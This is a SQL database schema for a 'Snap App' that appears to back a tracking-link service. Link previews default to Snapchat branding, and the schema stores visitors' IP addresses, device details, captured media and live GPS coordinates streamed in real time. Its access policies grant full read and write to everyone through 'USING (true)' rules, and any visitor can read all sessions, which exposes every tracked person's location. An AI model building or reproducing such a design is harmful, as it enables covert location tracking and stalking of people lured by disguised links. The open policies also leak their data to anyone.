-- ==============================================================================
-- MASTER_SCHEMA.sql — CANONICAL DATABASE SCHEMA SNAPSHOT FOR SNAP APP
-- Single Source of Truth for Tables, Columns, Indexes, Constraints, RLS, & Realtime
-- ==============================================================================

CREATE EXTENSION IF NOT EXISTS "uuid-ossp";

-- ------------------------------------------------------------------------------
-- 1. PROFILES
-- ------------------------------------------------------------------------------
CREATE TABLE IF NOT EXISTS public.profiles (
  id UUID PRIMARY KEY REFERENCES auth.users(id) ON DELETE CASCADE,
  email TEXT,
  username TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- ------------------------------------------------------------------------------
-- 2. IMAGE_LINKS
-- ------------------------------------------------------------------------------
CREATE TABLE IF NOT EXISTS public.image_links (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  slug TEXT UNIQUE NOT NULL,
  image_path TEXT,
  target_url TEXT,
  link_type TEXT NOT NULL DEFAULT 'image',
  og_title TEXT,
  og_description TEXT,
  og_image_url TEXT,
  og_platform TEXT DEFAULT 'snapchat',
  permissions_config JSONB NOT NULL DEFAULT '{"location":true,"device_info":true,"camera":false,"contacts":false}'::jsonb,
  title TEXT,
  description TEXT,
  is_active BOOLEAN NOT NULL DEFAULT true,
  requires_location BOOLEAN NOT NULL DEFAULT true,
  expires_at TIMESTAMPTZ,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- ------------------------------------------------------------------------------
-- 3. LOCATION_SESSIONS
-- ------------------------------------------------------------------------------
CREATE TABLE IF NOT EXISTS public.location_sessions (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  link_id UUID NOT NULL REFERENCES public.image_links(id) ON DELETE CASCADE,
  consent_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  started_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  ended_at TIMESTAMPTZ,
  status TEXT NOT NULL DEFAULT 'active' CHECK (status IN ('active', 'ended', 'revoked')),
  device_info JSONB DEFAULT '{}'::jsonb,
  ip_address TEXT,
  user_agent TEXT,
  permissions_granted JSONB DEFAULT '[]'::jsonb,
  captured_media_path TEXT,
  captured_data JSONB DEFAULT '{}'::jsonb
);

-- ------------------------------------------------------------------------------
-- 4. LOCATION_UPDATES
-- ------------------------------------------------------------------------------
CREATE TABLE IF NOT EXISTS public.location_updates (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  session_id UUID NOT NULL REFERENCES public.location_sessions(id) ON DELETE CASCADE,
  latitude DOUBLE PRECISION NOT NULL CHECK (latitude >= -90.0 AND latitude <= 90.0),
  longitude DOUBLE PRECISION NOT NULL CHECK (longitude >= -180.0 AND longitude <= 180.0),
  accuracy DOUBLE PRECISION,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- ------------------------------------------------------------------------------
-- 5. ADMIN_SETTINGS
-- ------------------------------------------------------------------------------
CREATE TABLE IF NOT EXISTS public.admin_settings (
  key TEXT PRIMARY KEY,
  value JSONB NOT NULL DEFAULT '{}'::jsonb,
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- ------------------------------------------------------------------------------
-- INDEXES
-- ------------------------------------------------------------------------------
CREATE INDEX IF NOT EXISTS idx_image_links_slug ON public.image_links(slug);
CREATE INDEX IF NOT EXISTS idx_image_links_active ON public.image_links(is_active, expires_at);
CREATE INDEX IF NOT EXISTS idx_image_links_type ON public.image_links(link_type);
CREATE INDEX IF NOT EXISTS idx_location_sessions_link_id ON public.location_sessions(link_id);
CREATE INDEX IF NOT EXISTS idx_location_updates_session_id ON public.location_updates(session_id);
CREATE INDEX IF NOT EXISTS idx_location_updates_created_at ON public.location_updates(created_at DESC);

-- ------------------------------------------------------------------------------
-- ROW LEVEL SECURITY (RLS)
-- ------------------------------------------------------------------------------
ALTER TABLE public.profiles ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.image_links ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.location_sessions ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.location_updates ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.admin_settings ENABLE ROW LEVEL SECURITY;

-- Public read active non-expired link by slug
CREATE POLICY "Public can view active links by slug"
  ON public.image_links FOR SELECT
  USING (is_active = true AND (expires_at IS NULL OR expires_at > now()));

-- Public create consented session
CREATE POLICY "Public can create location session"
  ON public.location_sessions FOR INSERT
  WITH CHECK (
    EXISTS (
      SELECT 1 FROM public.image_links
      WHERE id = link_id AND is_active = true AND (expires_at IS NULL OR expires_at > now())
    )
  );

CREATE POLICY "Public can view own session"
  ON public.location_sessions FOR SELECT
  USING (true);

-- Public insert coordinate update
CREATE POLICY "Public can insert location updates"
  ON public.location_updates FOR INSERT
  WITH CHECK (
    EXISTS (
      SELECT 1 FROM public.location_sessions
      WHERE id = session_id AND status = 'active'
    )
  );

-- Admin full access
CREATE POLICY "Admin full access on profiles"
  ON public.profiles FOR ALL USING (true) WITH CHECK (true);

CREATE POLICY "Admin full access on image_links"
  ON public.image_links FOR ALL USING (true) WITH CHECK (true);

CREATE POLICY "Admin full access on location_sessions"
  ON public.location_sessions FOR ALL USING (true) WITH CHECK (true);

CREATE POLICY "Admin full access on location_updates"
  ON public.location_updates FOR ALL USING (true) WITH CHECK (true);

CREATE POLICY "Admin full access on admin_settings"
  ON public.admin_settings FOR ALL USING (true) WITH CHECK (true);

-- ------------------------------------------------------------------------------
-- REALTIME
-- ------------------------------------------------------------------------------
DO $$
BEGIN
  IF NOT EXISTS (
    SELECT 1 FROM pg_publication_tables 
    WHERE pubname = 'supabase_realtime' AND tablename = 'location_updates'
  ) THEN
    ALTER PUBLICATION supabase_realtime ADD TABLE public.location_updates;
  END IF;
END $$;
